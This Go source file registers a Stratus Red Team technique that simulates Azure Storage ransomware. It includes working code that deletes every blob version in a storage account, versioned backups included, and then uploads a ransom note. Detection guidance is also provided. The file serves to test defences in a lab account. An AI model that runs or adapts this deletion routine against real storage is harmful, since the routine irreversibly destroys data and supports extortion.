package azure

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"os"

	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob/blob"

	"strings"
)

//go:embed main.tf
var tf []byte

const RansomContainerName = `your-files-deleted`
const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with evil@hackerz.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.'`

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.impact.blob-ransomware-individual-file-deletion",
		FriendlyName: "Azure ransomware via Storage Account Blob deletion",
		Description: `
Simulates Azure Storage ransomware activity that empties a storage account through individual Blob deletion, then uploads a ransom note.

Warm-up: 

- Create an Azure Storage Account, with versioning enabled
- Create Storage Containers in the Storage Account, each with a large number blobs with random content and extensions

Detonation: 

- List all available storage containers and their blobs and their versions in the bucket
- Delete all blobs in each container one by one, using [DeleteBlob](https://learn.microsoft.com/en-us/rest/api/storageservices/delete-blob?tabs=microsoft-entra-id)
- List and delete all blobs _again_ to delete any backups created by versioning
- Upload a ransom note to the storage account

Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket. 

References:
#TODO

`,
		Detection: `
You can detect ransomware activity by identifying abnormal patterns of blobs being downloaded or deleted in a storage account. 
In general, this can be done through [Blob storage events](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blob-event-overview)

Sample Blob storage event <code>DeleteBlob</code>, shortened for readability:

` + codeBlock + `json hl_lines="3 8 10"
{
  "operationName": "DeleteBlob",
  "category": "StorageDelete",
  "properties": {
    "accountName":"my-storage-account",
    "objectKey": "/my-storage-account/storage-container/somefolder/foo.bar"
  },
  "resourceId":"/subscriptions/ac382a89-52bf-4923-8abd-f1e4791cd48f/resourceGroups/my-resource-group/providers/Microsoft.Storage/storageAccounts/my-storage-account/blobServices/default"
}
` + codeBlock + `
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	storageAccount := params["storage_account_name"]
	//rg := params["resource_group_name"]

	serviceURL := fmt.Sprintf("https://%s.blob.core.windows.net/", storageAccount)

	azureConfig := providers.Azure()
	client, err := utils.GetAzureBlobClient(serviceURL, azureConfig.SubscriptionID, azureConfig.GetCredentials(), azureConfig.ClientOptions /*providers.Azure()*/, params)
	if err != nil {
		return fmt.Errorf("failed to instantiate Blob Client:  %w", err)
	}

	log.Println("Downloading Blobs...")
	err = downloadAllBlobs(client)
	if err != nil {
		return fmt.Errorf("unable to download blobs: %w", err)
	}

	log.Println("Deleting Blobs...")
	err = deleteAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to delete blobs: %w", err)
	}

	//Delete again to delete the versioned backups
	log.Println("Deleting versioned Blob backups...")
	err = deleteAllBlobVersions(client)
	if err != nil {
		return fmt.Errorf("unable to delete blobs: %w", err)
	}

	log.Println("Uploading ransom note...")

	err = utils.UploadBlob(client, RansomContainerName, RansomNoteFilename, strings.NewReader(RansomNoteContents))
	if err != nil {
		return fmt.Errorf("unable to create ransom note: %w", err)
	}
	log.Println("Technique execution completed")
	return nil
}

func downloadAllBlobs(client *azblob.Client) error {
	f, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()

	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return err
	}
	for containerName, versionMap := range blobMap {
		for blobName := range versionMap {
			_, err := client.DownloadFile(context.Background(), containerName, blobName, f, nil)
			if err != nil {
				return fmt.Errorf("error when downloading blob %s in container %s: %w", blobName, containerName, err)
			}
		}
	}
	return nil
}

func deleteAllBlobVersions(client *azblob.Client) error {

	blobMap, err := utils.ListAllBlobVersions(client)
	if err != nil {
		return err
	}
	for containerName, versionMap := range blobMap {
		containerClient := client.ServiceClient().NewContainerClient(containerName)

		log.Println("Iterating over container:", containerName)
		for blobName, versionIDs := range versionMap {
			for _, versionID := range versionIDs {
				blobClient := containerClient.NewBlobClient(blobName)
				if versionID != nil {
					blobClient, err = blobClient.WithVersionID(*versionID)
					log.Println("Deleting Blob", blobName, "with version", *versionID)
					if err != nil {
						return fmt.Errorf("can't instantiate versioned client for blob %s in container %s: %w", blobName, containerName, err)
					}

				}
				blobClient.Delete(
					context.Background(),
					&blob.DeleteOptions{
						DeleteSnapshots: to.Ptr(blob.DeleteSnapshotsOptionTypeInclude),
						//	BlobDeleteType: to.Ptr(blob.DeleteTypePermanent), This triggers a 409 error
					})

				if err != nil {
					return fmt.Errorf("error when deleting blob %s in container %s: %w", blobName, containerName, err)
				}
			}
		}
	}
	return nil
}
